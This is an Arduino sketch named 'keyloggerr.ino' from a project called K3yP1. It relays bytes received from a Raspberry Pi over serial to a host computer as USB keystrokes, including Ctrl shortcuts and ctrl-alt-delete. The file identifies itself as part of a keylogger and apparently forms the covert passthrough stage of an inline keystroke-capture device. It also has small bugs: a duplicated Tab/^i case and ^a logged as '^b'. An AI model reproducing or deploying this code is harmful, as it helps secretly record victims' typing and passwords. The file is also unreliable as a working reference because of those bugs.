/*
keyloggerr.ino is part of the K3yP1 project
Author: CuPcakeN1njA
*/

#include "Keyboard.h"

byte byteRead;
char character;

void setup()
{
  Keyboard.begin();
  Serial.begin(4800); /* This allows the program to print the serial data to a serial monitor to help when testing */
  Serial1.begin(9600);
}

void loop() {
  if (Serial1.available()) {
    byteRead = Serial1.read();
    if(byteRead==5){
      Serial.print("Execution charcater detected!"); /* You can delete lines with "serial.print" as these are only for testing, make sure you don't touch "serial1.print" as this is what reads the data from the PI */
    }
    else if(byteRead == 13){ /* Return */
      Serial.write(176);
      Keyboard.write(176);
    }
    else if(byteRead == 127){ /* Backspace */
      Serial.write(178);
      Keyboard.write(178);
    }
    else if(byteRead == 9){ /* Tab */
      Serial.write(179);
      Keyboard.write(179);
    }
    else if(byteRead == 126){ /* Delete */
      Serial.write(212);
      Keyboard.write(212);
    }
    else if(byteRead == 27){ /* Esc */
      Serial.write(177);
      Keyboard.write(177);
    }
    else if(byteRead == 11){ /* ^k */
      Serial.write("^k");
      Keyboard.press(128);
      Keyboard.press(107);
      Keyboard.releaseAll();
    }
    else if(byteRead == 9){ /* ^i */
      Serial.write("^i");
      Keyboard.press(128);
      Keyboard.press(105);
      Keyboard.releaseAll();
    }
    else if(byteRead == 21){ /* ^u */
      Serial.write("^u");
      Keyboard.press(128);
      Keyboard.press(117);
      Keyboard.releaseAll();
    }
    else if(byteRead == 2){ /* ^b */
      Serial.write("^b");
      Keyboard.press(128);
      Keyboard.press(98);
      Keyboard.releaseAll();
    }
    else if(byteRead == 25){ /* ^y */
      Serial.write("^y");
      Keyboard.press(128);
      Keyboard.press(121);
      Keyboard.releaseAll();
    }
    else if(byteRead == 26){ /* ^z */
      Serial.write("^z");
      Keyboard.press(128);
      Keyboard.press(122);
      Keyboard.releaseAll();
    }
    else if(byteRead == 22){ /* ^v */
      Serial.write("^v");
      Keyboard.press(128);
      Keyboard.press(118);
      Keyboard.releaseAll();
    }
    else if(byteRead == 3){ /* ^c */
      Serial.write("^c");
      Keyboard.press(128);
      Keyboard.press(99);
      Keyboard.releaseAll();
    }
    else if(byteRead == 1){ /* ^a */
      Serial.write("^b");
      Keyboard.press(128);
      Keyboard.press(97);
      Keyboard.releaseAll();
    }
    else if(byteRead == 222){ /* ctrl-alt-delete */
      Serial.write("ctrl-alt-del");
      Keyboard.press(KEY_LEFT_CTRL);
      Keyboard.press(KEY_LEFT_ALT);
      Keyboard.press(KEY_DELETE);
      delay(100);
      Keyboard.releaseAll();
    }
    else{
      Serial.write(byteRead);
      character = char(byteRead);
      Keyboard.print(character);
    }
    Keyboard.end();
  }
}
